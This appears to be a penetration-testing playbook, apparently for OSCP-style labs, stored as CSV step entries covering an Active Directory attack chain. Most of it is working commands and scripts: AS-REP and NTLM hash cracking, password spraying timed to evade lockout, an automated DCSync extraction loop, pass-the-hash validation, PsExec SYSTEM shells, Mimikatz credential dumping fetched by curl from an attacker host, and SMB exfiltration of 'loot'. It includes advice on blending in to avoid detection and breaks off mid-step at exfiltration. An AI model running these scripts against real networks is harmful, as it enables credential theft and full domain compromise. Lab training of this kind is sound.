Document result and proceed to alternative credential access methods.

TIME ESTIMATE: <10 seconds for hash extraction.","",""
"transfer-hashes","Transfer Hashes to Cracking System (If Needed)","Move hash files from Windows to Linux Kali system for Hashcat cracking","SKIP IF: Hashes extracted on Kali Linux directly (impacket-GetNPUsers).
Proceed directly to step 5 (crack-asrep-hashes).

REQUIRED IF: Hashes extracted on Windows with Rubeus.
Must transfer to Kali for Hashcat cracking (Kali has better wordlists, GPU support).

TRANSFER METHODS:
(1) SMB share: Kali → sudo impacket-smbserver share /home/kali/hashes -smb2support -username user -password pass.
Windows → copy C:\hashes.asreproast \\KALI_IP\share\hashes.asreproast.

(2) RDP disk sharing: rdesktop -r disk:share=/home/kali/hashes <WINDOWS_IP>, then copy C:\hashes.asreproast to \\tsclient\share.

(3) Base64 encode: Windows → certutil -encode C:\hashes.asreproast C:\hashes.b64, paste to Kali, base64 -d > hashes.asreproast.

(4) HTTP server: Kali → python3 -m http.server 8000 (POST endpoint), Windows → curl or PowerShell Invoke-WebRequest.

TIME ESTIMATE: 30-60 seconds.","",""
"crack-asrep-hashes","Crack AS-REP Hashes with Hashcat Mode 18200","Recover plaintext passwords from AS-REP hashes using offline dictionary and rule-based attacks","HASHCAT MODE: 18200 (Kerberos 5, etype 23, AS-REP).
VERIFY: hashcat --help | grep -i 'Kerberos' shows mode 18200.

ATTACK STRATEGY:
(1) STRAIGHT DICTIONARY: hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force (try first - fast, 14M passwords in <1 sec on GPU, ~30 sec on CPU).

(2) RULE-BASED: hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (adds common mutations - Password → Password1!, Password123, etc.).

(3) TARGETED: Create custom wordlist from username, org name, common patterns.
Example: echo -e 'dave\nDave\nDAVE\ndave123\nDave2023!' > custom.txt; hashcat -m 18200 hashes.asreproast custom.txt.

--force FLAG: Required in Kali VM without GPU (suppresses OpenCL warnings).

MONITORING: Press 's' key for status, --status --status-timer=30 for automatic updates.

TIME ESTIMATE: Weak password (dictionary + number) = 1-10 minutes.
Strong password (random 12+ chars) = infeasible.","",""
"validate-credentials","Validate Cracked Credentials","Confirm cracked passwords are valid and accounts are active","QUICK VALIDATION: Use kerbrute passwordspray with single-user file.
Create file: echo 'dave' > single_user.txt.
Test: kerbrute passwordspray -d corp.com --dc <DC_IP> single_user.txt 'Flowers1'.
Output: [+] VALID LOGIN: dave@corp.com:Flowers1 confirms credentials work.

ALTERNATIVE: CrackMapExec SMB authentication (also checks admin rights in one command - see next step).
SMB: crackmapexec smb <DC_IP> -u dave -p 'Flowers1' -d corp.com.
Output: [+] corp.com\dave:Flowers1 confirms valid.

TIME ESTIMATE: 5-10 seconds.

FAILURE SCENARIOS: STATUS_LOGON_FAILURE (password incorrect - Hashcat cracked wrong password or account changed), STATUS_ACCOUNT_LOCKED_OUT (account locked since hash extraction), STATUS_ACCOUNT_DISABLED (account disabled by admin).

If validation fails, try other cracked hashes or proceed to alternative attacks.","",""
"check-admin-rights","Check for Local Administrator Rights","Identify systems where compromised user has local administrator privileges for lateral movement","CRACKMAPEXEC SUBNET SCAN: Test credentials against entire subnet to find local admin access.

COMMAND: crackmapexec smb 192.168.50.0/24 -u dave -p 'Flowers1' -d corp.com.
Scans all 254 IPs in /24 subnet.

OUTPUT: [+] 192.168.50.75 corp.com\dave:Flowers1 (Pwn3d!) = LOCAL ADMIN rights on 192.168.50.75.
[+] 192.168.50.80 corp.com\dave:Flowers1 = valid credentials but NOT admin.

PWND INDICATOR: Shown when user can access ADMIN$ share (local admin rights).

LOCAL ADMIN = FULL SYSTEM COMPROMISE: Can execute code as SYSTEM, dump SAM/LSA secrets, extract cached credentials, dump LSASS memory for plaintext passwords and Kerberos tickets.

LATERAL MOVEMENT: Use evil-winrm, psexec, wmiexec to access (Pwn3d!) systems.

STANDARD USER (no Pwn3d!): Still valuable - can enumerate AD, access file shares, attempt local privilege escalation, Kerberoast, AS-REP roast other users.

TIME ESTIMATE: 2-4 minutes for /24 subnet scan.","",""
"verify-kerberos-access","Verify Kerberos Port Access","Confirm UDP port 88 is accessible on domain controller for Kerberos authentication","Use nmap to verify Kerberos port 88/UDP is reachable.
This is REQUIRED for Kerbrute to function.

If port 88 is blocked, this attack chain cannot proceed (fall back to internal spray methods).","",""
"enumerate-valid-users","Enumerate Valid Domain Usernames","Validate usernames against domain using Kerberos AS-REQ to build target list for spraying","Use kerbrute userenum with username wordlist.
Kerbrute sends AS-REQ (TGT request) for each username.
Domain controller responds differently for valid users (PREAUTH_REQUIRED) vs invalid users (PRINCIPAL_UNKNOWN).
This identifies valid usernames without authentication.

Recommended wordlist: /usr/share/seclists/Usernames/Names/names.txt (common first names) or /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt (comprehensive).

Save valid usernames to file with -o flag for next step.","",""
"spray-common-password","Spray Common Password Against Valid Users","Test single common password against all valid usernames to find working credentials","Use kerbrute passwordspray with valid username list from previous step.
Test ONE common password (e.g., Nexus123!, Welcome2023!, Password123!, CompanyName2023!).
Kerbrute attempts Kerberos authentication for each user.
Success = TGT issued (valid credentials).
Failure = PREAUTH_FAILED (wrong password).

ONLY 2 UDP packets per attempt = extremely fast.

CRITICAL: Only spray 3-4 passwords total to avoid lockout risk (most domains have 5 attempt threshold).
Example: spray 'Password123!', wait 30min, spray 'Welcome2023!', wait 30min, spray 'Summer2023!'.

Save results with -o flag.","",""
"spray-additional-password","Spray Additional Password (Optional)","Test second/third common password if first spray found zero credentials","If first password spray was unsuccessful, wait 30+ minutes for observation window to reset, then spray a different common password.
Limit to 3-4 total passwords to stay under typical lockout threshold of 5 attempts.

Common OSCP-relevant passwords: Password123!, Welcome2023!, CompanyName2023!, Summer2023!, Winter2023!, Spring2023!, Autumn2023!, Admin123!, Password1, Passw0rd!.

TIMING: Wait at least 30 minutes between spray attempts (common observation window duration).
Use timer to track when safe to spray again.","",""
"validate-credentials","Quick-Validate Found Credentials","Confirm credentials are valid and still active using fast Kerberos validation","Use kerbrute passwordspray with single-user file containing found username to re-validate credentials.
This ensures credentials weren't disabled since discovery and confirms password is correct.
Takes <5 seconds.

Creates file with found username (echo 'username' > single_user.txt) then runs kerbrute passwordspray to confirm.

Alternative: skip to next step (admin validation) which also confirms credentials work.","",""
"check-admin-rights","Check for Local Admin Rights on Network Systems","Identify which systems the compromised user has local administrator privileges on","Use CrackMapExec to scan target subnet (or specific IPs) with found credentials.
CME tests SMB authentication and checks if user can access ADMIN$ share (indicates local admin).
Pwn3d! indicator = local admin rights = can execute code as SYSTEM.

Scan single IP first to verify credentials work with SMB, then scan subnet /24 to find all systems where user is admin.
Example: crackmapexec smb 192.168.50.0/24 -u username -p password -d domain.com.
Look for (Pwn3d!) in output.

If user is admin on workstations, pivot there to dump credentials (SAM, LSA, LSASS) for lateral movement.","",""
"lateral-movement-prep","Prepare for Lateral Movement and Privilege Escalation","Plan next attack phase based on admin rights discovery results","DECISION TREE based on previous step results:

(1) If user has Pwn3d! on any systems → proceed to dump-credentials-via-smb step to extract SAM/LSA/LSASS credentials.

(2) If user has NO admin rights → attempt evil-winrm or RDP login as standard user, then perform local privilege escalation (check for vulnerable services, unquoted service paths, AlwaysInstallElevated, etc.).

(3) If SMB access denied (external position) → use credentials for other services: WinRM (evil-winrm), RDP, VPN access, web application authentication, or pivot through VPN/Citrix to internal network then retry SMB.

OSCP STRATEGY: Even standard domain user credentials are valuable - can enumerate AD, access file shares, pivot to other services.
Don't stop if no local admin found.","",""
"enumerate-high-value-targets","Identify High-Value User Accounts for Targeted Extraction","Enumerate and prioritize specific user accounts that provide lateral movement paths to target systems","TARGET IDENTIFICATION STRATEGY: Focus DCSync efforts on users most likely to provide access to specific systems or sensitive data.

HIGH-VALUE ACCOUNT CATEGORIES:

(1) DOMAIN ADMINS (Unrestricted domain access):
net group ""Domain Admins"" /domain
OR (from Kali):
rpcclient -U 'username%password' <DC_IP> -c 'enumdomgroups' | grep -i admin
ldapsearch -x -H ldap://<DC_IP> -D 'username@domain' -w 'password' -b 'DC=corp,DC=com' '(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=com)' sAMAccountName

Expected output:
Administrator
sql_admin
backup_admin
<...Domain Admin members...>

(2) LOCAL ADMINISTRATORS ON TARGET SYSTEMS:

Method A: Remote registry query (requires admin access to target):
reg query ""\\\\<TARGET>\\HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names"" /s

Method B: CrackMapExec local admin enumeration:
crackmapexec smb <TARGET> -u <user> -p <pass> --local-groups Administrators

Output:
[+] 192.168.50.100   [*] Members of group 'Administrators':
    corp\\Administrator
    corp\\sqlsvc
    corp\\backup_admin

Method C: PowerView (if Windows access):
Get-NetLocalGroupMember -ComputerName <TARGET> -GroupName Administrators

(3) SERVICE ACCOUNTS (Often over-privileged):

Identify service accounts (naming patterns):
ldapsearch -x -H ldap://<DC_IP> -D 'user@domain' -w 'pass' -b 'DC=corp,DC=com' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName

Common patterns:
- svc_*, service_*, sql*, mssql*, admin*, backup*, web*, iis*

Example output:
sqlsvc (MSSQLSvc/sql01.corp.com:1433)
backupsvc (BackupExec/backup01.corp.com)
webadmin (HTTP/web01.corp.com)

(4) IT ADMINISTRATORS (Likely admin on multiple systems):

Query IT groups:
net group ""IT Admins"" /domain
net group ""Help Desk"" /domain
net group ""Server Admins"" /domain

Cross-reference with target systems:
For each IT admin, check local admin membership on targets via CrackMapExec.

PRIORITIZATION MATRIX:

Create target list (targets.txt):
# Priority 1: Domain Admins (unrestricted access)
Administrator
sql_admin
backup_admin

# Priority 2: Local admins on target systems  
sqlsvc (admin on SQL01: 192.168.50.100)
webadmin (admin on WEB01: 192.168.50.105)

# Priority 3: Service accounts (potentially over-privileged)
backupsvc
iis_service

# Priority 4: IT admins (multi-system access likely)
jdoe_admin
helpdeskuser

USERNAME EXTRACTION FOR DCSYNC:

From enumeration above, extract just usernames:
Administrator
sql_admin
backup_admin
sqlsvc
webadmin
backupsvc
iis_service
jdoe_admin

Save to file:
echo -e ""Administrator\nsql_admin\nbackup_admin\nsqlsvc\nwebadmin\nbackupsvc\niis_service\njdoe_admin"" > dcsync_targets.txt

VALIDATION: Verify target list is reasonable size.
wc -l dcsync_targets.txt
Optimal: 10-50 users (fast DCSync, high success probability)
Too many: >100 users (consider full dump instead)
Too few: <5 users (may miss lateral movement opportunities)

OPSEC CONSIDERATION: User enumeration generates LDAP queries (EventID 4662) but is common administrative activity - low detection risk.

TIME ESTIMATE: 10-15 minutes (enumeration and prioritization).","",""
"verify-dcsync-permissions","Verify DCSync Permissions Before Targeted Extraction","Confirm replication rights and DC connectivity before executing targeted DCSync operations","PREREQUISITE VERIFICATION: Same permissions required for targeted DCSync as full dump, but verify BEFORE iterating through target list to avoid wasting time.

REQUIRED PERMISSIONS:
- DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

QUICK VERIFICATION TEST:
impacket-secretsdump -just-dc-user Administrator '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'

SUCCESS: Administrator hash retrieved → Rights confirmed, proceed to targeted DCSync loop.
FAILURE: ERROR_ACCESS_DENIED → Insufficient rights, STOP (cannot proceed with any DCSync).

NETWORK CONNECTIVITY VERIFICATION:
sudo nmap -p 445,135 -Pn -v <DC_IP>

REQUIRED:
445/tcp open (SMB - primary replication channel)
135/tcp open (RPC - DRSUAPI endpoint mapper)

TIME SYNCHRONIZATION (Critical for Kerberos):
sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>
date (verify <5 min difference from DC)

OPSEC BASELINE:
- Single user DCSync test generates 1 EventID 4662 event
- Targeted extraction of 20 users = 20 EventID 4662 events
- Compare to full dump: 2000 users = 2000 events
- Targeted approach = 99% reduction in detection signature

BANDWIDTH ESTIMATE:
- Single user extraction: ~10 KB transfer, <5 seconds
- 20 users: ~200 KB transfer, <2 minutes
- 50 users: ~500 KB transfer, <5 minutes

CRITICAL: If verification test fails, DO NOT proceed with target list iteration.
Alternative approaches:
(1) Obtain Domain Admin credentials via different method (Kerberoasting, AS-REP roasting, local privilege escalation)
(2) Add replication rights to compromised account (requires high privileges)
(3) Extract NTDS.dit via VSS shadow copy (different permissions required)

TIME ESTIMATE: 2-3 minutes.","",""
"dcsync-targeted-users","Execute Targeted DCSync for High-Value User Credentials","Extract NTLM hashes for specific prioritized users to minimize detection and maximize efficiency","TARGETED DCSYNC LOOP: Iterate through priority user list (dcsync_targets.txt) and extract credentials individually.

SINGLE USER DCSYNC COMMAND:
impacket-secretsdump -just-dc-user <USERNAME> '<DOMAIN>/<ADMIN_USER>:<PASSWORD>@<DC_IP>' >> targeted_hashes.txt

Example:
impacket-secretsdump -just-dc-user sqlsvc 'corp.com/dave:Password123!@192.168.50.1' >> targeted_hashes.txt

OUTPUT FORMAT (appended to targeted_hashes.txt):
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
sqlsvc:1125:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

AUTOMATED EXTRACTION LOOP (Bash script):

#!/bin/bash
DOMAIN=""corp.com""
ADMIN_USER=""dave""
ADMIN_PASS=""Password123!""
DC_IP=""192.168.50.1""
OUTPUT=""targeted_hashes.txt""

echo ""[*] Starting targeted DCSync extraction""
echo ""[*] Timestamp: $(date)"" > $OUTPUT

while read username; do
  echo ""[*] Extracting: $username""
  impacket-secretsdump -just-dc-user ""$username"" ""$DOMAIN/$ADMIN_USER:$ADMIN_PASS@$DC_IP"" 2>&1 | tee -a $OUTPUT
  
  # Check if extraction succeeded
  if grep -q ""$username:"" $OUTPUT; then
    echo ""[+] SUCCESS: $username extracted""
  else
    echo ""[-] FAILED: $username not found or error""
  fi
  
  # Small delay to avoid hammering DC (OPSEC)
  sleep 2
done < dcsync_targets.txt

echo ""[*] Targeted DCSync complete""
echo ""[*] Results saved to: $OUTPUT""
wc -l $OUTPUT

EXECUTE SCRIPT:
chmod +x targeted_dcsync.sh
./targeted_dcsync.sh

MONITORING PROGRESS:
tail -f targeted_hashes.txt (watch real-time extraction)

Expected output:
[*] Extracting: Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
[+] SUCCESS: Administrator extracted
[*] Extracting: sqlsvc
sqlsvc:1125:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
[+] SUCCESS: sqlsvc extracted
[*] Extracting: webadmin
[-] FAILED: webadmin not found or error
<...continues for all users in dcsync_targets.txt...>

ERROR HANDLING:

- ""User not found"": Username misspelled or account doesn't exist (skip, continue to next)
- ""Access denied"" mid-loop: Credentials invalidated or rights revoked (STOP, investigate)
- ""Connection timeout"": Network instability or DC offline (retry or abort)

FAILURE RECOVERY: If script interrupted, targeted_hashes.txt preserves partial results.
Resume: Remove successfully extracted users from dcsync_targets.txt, re-run script.

EXTRACT CLEAN HASH LIST:
grep -E '^[a-zA-Z0-9_-]+:[0-9]+:' targeted_hashes.txt > clean_hashes.txt

Format:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
sqlsvc:1125:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
backup_admin:1130:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
<...extracted hashes only, no script output...>

EXTRACT NTLM HASHES FOR HASHCAT:
grep -E '^[a-zA-Z0-9_-]+:[0-9]+:' targeted_hashes.txt | cut -d ':' -f 4 > ntlm_hashes.txt

Result (ntlm_hashes.txt):
a9b30e5b0dc865eadcea9411e4ade72d
8846f7eaee8fb117ad06bdd830b7586c
5f4dcc3b5aa765d61d8327deb882cf99
<...pure NTLM hashes for cracking...>

OPSEC IMPACT:

Detection comparison:
- Full domain dump (2000 users): 2000 EventID 4662 events, 20-60 min duration, 500MB-1GB transfer
- Targeted extraction (20 users): 20 EventID 4662 events, 2-5 min duration, 200KB transfer

REDUCTION: 99% fewer events, 90% faster, 99.96% less data transfer

BLUE TEAM PERSPECTIVE: 20 replication events over 5 minutes blends with legitimate administrative activity.
2000 events over 30 minutes from non-DC IP = INSTANT ALERT.

TIME ESTIMATES:
- 10 users: 1-2 minutes
- 20 users: 2-4 minutes
- 50 users: 5-10 minutes

TIME ESTIMATE: 3-7 minutes (20-30 targeted users).","",""
"crack-targeted-hashes","Crack Targeted NTLM Hashes with Focused Attack Strategy","Recover plaintext passwords for high-value accounts using optimized cracking approach","TARGETED CRACKING STRATEGY: Focus on high-quality attacks for small hash set. Better results than fast attacks on large hash set.

HASH SET SIZE: 10-50 hashes (from targeted DCSync)
CRACKING APPROACH: Use multiple attack vectors, invest more time per hash.

ATTACK PHASE 1: STRAIGHT DICTIONARY (Baseline - fast)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force

Time: 1-5 minutes
Expected: 15-25% crack rate (weak passwords: Password1, Welcome123, company name)

ATTACK PHASE 2: RULE-BASED ATTACK (Primary attack - best ROI)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Rule mutations:
- Capitalize: password → Password
- Uppercase: password → PASSWORD  
- Append numbers: password → password1, password123, password2023
- Leet: password → p@ssw0rd
- Common patterns: password → Password1!, Passw0rd!, P@ssword123

Time: 10-30 minutes
Expected: 40-60% crack rate (admin accounts with corporate password policies)

ATTACK PHASE 3: CUSTOM WORDLIST (Organization-specific)

Create custom wordlist from org intelligence:
echo -e ""CompanyName\nDepartment\nCEOname\nCityName\nProductName\nYear2023\nWelcome\nPassword"" > custom.txt

Combination attacks:
hashcat -m 1000 -a 0 ntlm_hashes.txt custom.txt -r /usr/share/hashcat/rules/best64.rule --force

Time: 5-10 minutes
Expected: Additional 10-20% crack rate (organization-specific passwords)

ATTACK PHASE 4: HYBRID ATTACK (Wordlist + mask)
hashcat -m 1000 -a 6 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?d?d --force

Appends 0000-9999 to each wordlist word.
Example: Password → Password0000, Password0001, ..., Password9999

Time: 30-90 minutes (small hash set, so feasible)
Expected: Additional 5-15% crack rate (year patterns: Password2023, Welcome2024)

ATTACK PHASE 5: MASK ATTACK (Pattern-based - if time permits)

Common corporate patterns:
?u?l?l?l?l?l?l?l?d?d?d?d (Uppercase + 7 lowercase + 4 digits: Password1234)
?u?l?l?l?l?l?l?d?d?d! (Uppercase + 6 lowercase + 3 digits + !: Welcome123!)

Mask attack:
hashcat -m 1000 -a 3 ntlm_hashes.txt ?u?l?l?l?l?l?l?l?d?d?d?d --force

Time: Hours (keyspace dependent)
Expected: Variable (catches pattern-based passwords not in wordlists)

MONITOR CRACKING PROGRESS:

Press 's' for status:
Speed.........: 500.0 MH/s
Recovered.....: 12/23 (52.17%) Digests
Progress......: 14344384/14344384 (100.00%)

VIEW CRACKED PASSWORDS:
hashcat -m 1000 ntlm_hashes.txt --show

Output:
a9b30e5b0dc865eadcea9411e4ade72d:Password123!
8846f7eaee8fb117ad06bdd830b7586c:SQLPass2023
5f4dcc3b5aa765d61d8327deb882cf99:Backup1!
<...hash:password pairs...>

MAP HASHES TO USERNAMES:

Create username:password list for validation:
while read line; do
  hash=$(echo $line | cut -d ':' -f 1)
  pass=$(echo $line | cut -d ':' -f 2)
  user=$(grep ""$hash"" clean_hashes.txt | cut -d ':' -f 1)
  if [ -n ""$user"" ]; then
    echo ""$user:$pass""
  fi
done < <(hashcat -m 1000 ntlm_hashes.txt --show) > cracked_credentials.txt

Result (cracked_credentials.txt):
Administrator:Password123!
sqlsvc:SQLPass2023
backup_admin:Backup1!
webadmin:IIS2023Web!
<...username:password ready for use...>

PRIORITY VERIFICATION:

Check if Domain Admin accounts cracked:
grep -f <(cat dcsync_targets.txt | head -5) cracked_credentials.txt

If Domain Admin cracked: CRITICAL WIN - domain-wide access available.
If service accounts cracked: Check target system access (SQL, Web servers).
If IT admins cracked: Likely admin on multiple systems.

UNCRACKED HASH USAGE:

IMPORTANT: Can use NTLM hashes directly with Pass-the-Hash (no plaintext needed).

Extract uncracked hashes:
comm -23 <(cut -d ':' -f 4 clean_hashes.txt | sort) <(hashcat -m 1000 ntlm_hashes.txt --show | cut -d ':' -f 1 | sort) > uncracked_hashes.txt

Map back to usernames:
for hash in $(cat uncracked_hashes.txt); do
  grep ""$hash"" clean_hashes.txt
done > uncracked_users.txt

Result: Can still use for PTH validation even without plaintext passwords.

CRACKING OPTIMIZATION:

- Small hash set (10-50) allows longer attacks per hash
- Prioritize attacks on Domain Admin hashes (most valuable)
- Stop after 60%+ crack rate if time-constrained (diminishing returns)
- GPU cracking 10-50x faster if available

FAILURE SCENARIOS:

- Zero cracks after Phase 1-2: Admin accounts have strong passwords
  → Solution: Try custom wordlists (company name, location, products)
  → Alternative: Use uncracked hashes with PTH (no plaintext needed)

- Low crack rate <30%: Strong password policy enforced
  → Solution: Extend to Phase 4-5 attacks, use organizational intelligence

TIME ESTIMATE: 20-40 minutes (Phase 1-3 attacks, sufficient for OSCP).","",""
"validate-credentials-pth","Validate Credentials and NTLM Hashes with Pass-the-Hash","Confirm cracked passwords and uncracked hashes work for authentication and identify target system access","VALIDATION STRATEGY: Test both cracked passwords AND uncracked NTLM hashes against target systems to map user-to-system access.

TARGET SYSTEMS (From enumeration step 1):
- SQL01: 192.168.50.100 (sqlsvc should have admin access)
- WEB01: 192.168.50.105 (webadmin should have admin access)
- DC01: 192.168.50.1 (Domain Admins should have access)
- FILE01: 192.168.50.110 (backup_admin should have access)

VALIDATION METHOD 1: CRACKMAPEXEC WITH PASSWORDS (Cracked accounts)

Test specific user against specific target:
crackmapexec smb 192.168.50.100 -u sqlsvc -p 'SQLPass2023' -d corp.com

Expected output:
[+] 192.168.50.100:445 SQL01 [+] corp.com\\sqlsvc:SQLPass2023 (Pwn3d!)
                                                              ^^^^^^^^ LOCAL ADMIN ACCESS CONFIRMED

OR:
[+] 192.168.50.100:445 SQL01 [+] corp.com\\sqlsvc:SQLPass2023
                                                              (no Pwn3d) = Valid creds, NOT admin

VALIDATION METHOD 2: CRACKMAPEXEC WITH NTLM HASHES (Uncracked accounts)

Test uncracked hash:
crackmapexec smb 192.168.50.110 -u backup_admin -H '5f4dcc3b5aa765d61d8327deb882cf99' -d corp.com

Same output format - works without plaintext password.

AUTOMATED VALIDATION SCRIPT:

#!/bin/bash
DOMAIN=""corp.com""
TARGETS=""192.168.50.100 192.168.50.105 192.168.50.110""
OUTPUT=""validation_results.txt""

echo ""[*] Validating cracked credentials"" > $OUTPUT

# Test cracked passwords
while IFS=':' read user pass; do
  echo ""[*] Testing: $user:$pass""
  for target in $TARGETS; do
    crackmapexec smb $target -u ""$user"" -p ""$pass"" -d $DOMAIN 2>&1 | tee -a $OUTPUT
  done
done < cracked_credentials.txt

echo """" >> $OUTPUT
echo ""[*] Validating uncracked hashes (PTH)"" >> $OUTPUT

# Test uncracked hashes
while read line; do
  user=$(echo $line | cut -d ':' -f 1)
  hash=$(echo $line | cut -d ':' -f 4)
  echo ""[*] Testing: $user (hash)""
  for target in $TARGETS; do
    crackmapexec smb $target -u ""$user"" -H ""$hash"" -d $DOMAIN 2>&1 | tee -a $OUTPUT
  done
done < uncracked_users.txt

echo ""[*] Validation complete""
grep ""Pwn3d"" $OUTPUT | tee pwned_access.txt

EXECUTE VALIDATION:
chmod +x validate_access.sh
./validate_access.sh

ANALYZE RESULTS:

Extract (Pwn3d!) access:
cat pwned_access.txt

Expected output:
[+] 192.168.50.100:445 SQL01 [+] corp.com\\sqlsvc:SQLPass2023 (Pwn3d!)
[+] 192.168.50.105:445 WEB01 [+] corp.com\\webadmin:IIS2023Web! (Pwn3d!)
[+] 192.168.50.1:445   DC01  [+] corp.com\\Administrator:Password123! (Pwn3d!)

CREATE ACCESS MATRIX:

| User          | Target System | IP             | Access Level | Auth Method |
|---------------|---------------|----------------|--------------|-------------|
| Administrator | DC01          | 192.168.50.1   | Local Admin  | Password    |
| sqlsvc        | SQL01         | 192.168.50.100 | Local Admin  | Password    |
| webadmin      | WEB01         | 192.168.50.105 | Local Admin  | Password    |
| backup_admin  | FILE01        | 192.168.50.110 | Local Admin  | NTLM Hash   |

Save to: access_matrix.md

PRIORITIZE TARGETS:

HIGHEST VALUE:
- Domain Controller access (any Domain Admin) = Full domain compromise
- Database server admin = Sensitive data access, credential hunting in DB
- File server admin = Document access, GPO files in SYSVOL

NEXT STEP DECISION:
- If Domain Admin access confirmed → Can access ANY domain resource (proceed to step 6)
- If target system admin confirmed → Direct access to objective (proceed to step 6)
- If no (Pwn3d!) results → Need privilege escalation OR try additional users

VALIDATION CONFIRMATION:

Test actual access (not just SMB):
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.com/sqlsvc@192.168.50.100

If drops to C:\\> prompt with SYSTEM privileges → Access CONFIRMED.

FAILURE SCENARIOS:

- All STATUS_LOGON_FAILURE: Wrong domain, account lockouts, or credentials invalidated
  → Verify: Domain name correct, check account status (net user <user> /domain)

- Valid auth but no (Pwn3d!): Users are standard users, not local admins
  → Solution: Try privilege escalation after gaining shell access

- Connection timeout: SMB port 445 blocked
  → Alternative: Try WinRM (port 5985) with crackmapexec winrm

TIME ESTIMATE: 5-10 minutes (validation across 3-5 target systems).","",""
"lateral-movement-psexec","Execute Lateral Movement with PSExec for SYSTEM Shells","Establish SYSTEM-level shell access on validated target systems for privilege escalation and objective completion","PSEXEC vs WMIEXEC TRADE-OFF:
- PSExec: Creates service (PSEXESVC), writes to ADMIN$, provides SYSTEM shell (highest privileges)
- WMIExec: No service, no file writes (stealthier), provides user-level shell

USE PSEXEC WHEN:
(1) Need SYSTEM privileges (credential dumping, system file access)
(2) Target is validated (Pwn3d!) - detection risk acceptable
(3) Objective requires full system control
(4) Quick wins prioritized over stealth

IMPACKET PSEXEC COMMAND:

With password (cracked accounts):
impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'

With NTLM hash (uncracked accounts - Pass-the-Hash):
impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USERNAME>@<TARGET>'

Example (password):
impacket-psexec 'corp.com/sqlsvc:SQLPass2023@192.168.50.100'

Example (hash):
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c 'corp.com/sqlsvc@192.168.50.100'

SUCCESSFUL CONNECTION:
[*] Requesting shares on 192.168.50.100.....
[*] Found writable share ADMIN$
[*] Uploading file <random>.exe
[*] Opening SVCManager on 192.168.50.100.....
[*] Creating service <random> on 192.168.50.100.....
[*] Starting service <random>.....
[*] Got shell!

C:\\Windows\\system32>
whoami
nt authority\\system
        ^^^^^^^^^^^^^^^^ SYSTEM privileges confirmed

hostname
SQL01

HIGH-VALUE SYSTEM ACTIONS:

(1) DATABASE SERVER (SQL01 - sqlsvc access):

C:\\> whoami
nt authority\\system

C:\\> dir ""C:\\Program Files\\Microsoft SQL Server""
(Identify SQL instance)

C:\\> sqlcmd -S localhost -E -Q ""SELECT name FROM sys.databases""
(List databases)

C:\\> sqlcmd -S localhost -E -Q ""SELECT * FROM master.dbo.syslogins WHERE sysadmin = 1""
(Find SA-equivalent accounts)

Credential hunting:
C:\\> findstr /si password *.config *.xml *.ini
C:\\> findstr /si connectionstring *.config
(Find database connection strings with credentials)

(2) FILE SERVER (FILE01 - backup_admin access):

C:\\> whoami
nt authority\\system

C:\\> dir C:\\Shares
C:\\> dir \\\\localhost\\SharedData
(Browse shared data)

C:\\> dir /s /b C:\\*.kdbx C:\\*.key C:\\*password* C:\\*backup*
(Find KeePass databases, password files, backups)

C:\\> icacls C:\\Shares\\Confidential
(Check file permissions)

(3) WEB SERVER (WEB01 - webadmin access):

C:\\> whoami
nt authority\\system

C:\\> dir C:\\inetpub\\wwwroot
(Web application root)

C:\\> type C:\\inetpub\\wwwroot\\web.config
(Find database connection strings, API keys)

C:\\> dir /s /b C:\\inetpub\\*.config C:\\inetpub\\*.ini
(Configuration files with credentials)

(4) DOMAIN CONTROLLER (DC01 - Administrator access):

C:\\> whoami
nt authority\\system

C:\\> dir \\\\localhost\\SYSVOL\\corp.com
(Domain SYSVOL share)

C:\\> dir \\\\localhost\\SYSVOL\\corp.com\\scripts
(Logon scripts - often contain credentials)

C:\\> type \\\\localhost\\SYSVOL\\corp.com\\Policies\\*.xml
(Group Policy Preferences - may contain credentials)

CREDENTIAL DUMPING (All systems):

Upload Mimikatz:
C:\\> curl http://<KALI_IP>:8000/mimikatz.exe -o C:\\Windows\\Temp\\m.exe

Dump LSASS:
C:\\> C:\\Windows\\Temp\\m.exe privilege::debug sekurlsa::logonpasswords exit

Expected output:
Authentication Id : 0 ; 123456
Session           : Interactive from 1
User Name         : dave
Domain            : CORP
Logon Server      : DC01
Logon Time        : 11/23/2025 10:00:00
SID               : S-1-5-21-...
  msv :
   [00000003] Primary
   * Username : dave
   * Domain   : CORP
   * NTLM     : a9b30e5b0dc865eadcea9411e4ade72d
   * SHA1     : ...
  tspkg :
   * Username : dave
   * Domain   : CORP
   * Password : Welcome2023
        ^^^^^^^^^^^^^^^^ PLAINTEXT PASSWORD EXTRACTED

Save credentials:
C:\\> C:\\Windows\\Temp\\m.exe privilege::debug sekurlsa::logonpasswords exit > C:\\Windows\\Temp\\creds.txt

Exfiltrate:
Kali: impacket-smbserver -smb2support share /home/kali/loot
